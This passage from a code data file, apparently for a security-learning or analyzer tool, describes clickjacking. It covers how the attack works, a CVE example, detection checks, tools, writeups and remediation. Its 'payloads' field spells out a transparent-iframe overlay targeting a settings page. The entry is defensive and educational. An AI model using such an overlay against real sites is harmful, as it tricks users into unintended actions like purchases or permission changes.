      "The attacker creates a page with a transparent iframe containing the target application positioned over enticing content. When the victim clicks, they interact with the hidden target app—potentially changing settings, making purchases, or granting permissions.",
    simpleHowItWorks:
      "Imagine a see-through sticker placed over a real button. You see 'Win a Prize!' but underneath the sticker is a 'Transfer Money' button on your bank's website.",
    cveExample: {
      id: "CVE-2017-0232",
      description:
        "Microsoft Edge had a clickjacking vulnerability where UI elements could be spoofed to trick users into unintended actions.",
    },
    detectionTechniques: [
      "Check for X-Frame-Options header (DENY or SAMEORIGIN)",
      "Check Content-Security-Policy frame-ancestors directive",
      "Try embedding the target in an iframe",
      "Test with Burp Clickbandit tool",
      "Verify JavaScript frame-busting can't be bypassed",
    ],
    payloads: [
      '<iframe src="https://target.com/settings" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>',
      "Drag-and-drop clickjacking with draggable elements",
      "Multi-step clickjacking with positioned buttons",
    ],
    tools: ["Burp Clickbandit", "Clickjacker.io", "Browser DevTools", "OWASP ZAP"],
    writeupLinks: [
      { title: "HackerOne: Clickjacking on Settings", url: "https://hackerone.com/reports/405765" },
      { title: "PortSwigger: Clickjacking Labs", url: "https://portswigger.net/web-security/clickjacking" },
    ],
    remediation: [
      "Set X-Frame-Options: DENY or SAMEORIGIN",
      "Use CSP frame-ancestors 'self'",
      "Implement frame-busting JavaScript as fallback",
      "Add confirmation steps for sensitive actions",
      "Use SameSite cookies to prevent cross-origin framing attacks",
    ],
    analyzerContext:
      "Focus on clickjacking vulnerabilities. Check X-Frame-Options and CSP frame-ancestors headers. Test if the page can be framed by external sites.",
  },
];
